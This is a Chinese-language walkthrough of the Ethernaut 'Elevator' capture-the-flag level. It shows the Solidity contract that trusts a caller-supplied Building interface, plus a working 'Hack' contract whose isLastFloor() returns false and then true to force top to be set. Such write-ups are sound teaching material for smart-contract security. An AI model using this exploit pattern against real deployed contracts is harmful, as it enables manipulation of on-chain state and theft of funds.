# Ethernaut 11-Elevator

## 本关目标

- 到达顶层，将 top 设置为 true

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    // 将msg.sender转换成Building接口的实现
    Building building = Building(msg.sender);

    // 调用外部传入的Building接口，如果不是顶层，则赋值floor
    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      // 再次调用building的isLastFloor赋值是否为顶层
      top = building.isLastFloor(floor);
    }
  }
}
```

## 解决方案

1. 可以看到 goTo 方法中的 Building 实现依赖外部实现，并且调用了两次 isLastFloor()
2. 在 Hack 合约中实现 isLastFloor(uint)方法，保证第一次调用返回 false，第二次调用返回 true 即可

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Hack {
    bool entried;
    Elevator private immutable elevator;

    constructor(address _target) {
        elevator = Elevator(_target);
    }
    function isLastFloor(uint) external returns (bool){
        // 只要调用过则只返回true, 第一次调用返回false
        if(entried) {
            return true;
        } else {
            entried = true;
            return false;
        }
    }

    function hack() public {
        elevator.goTo(3);
    }
}
```
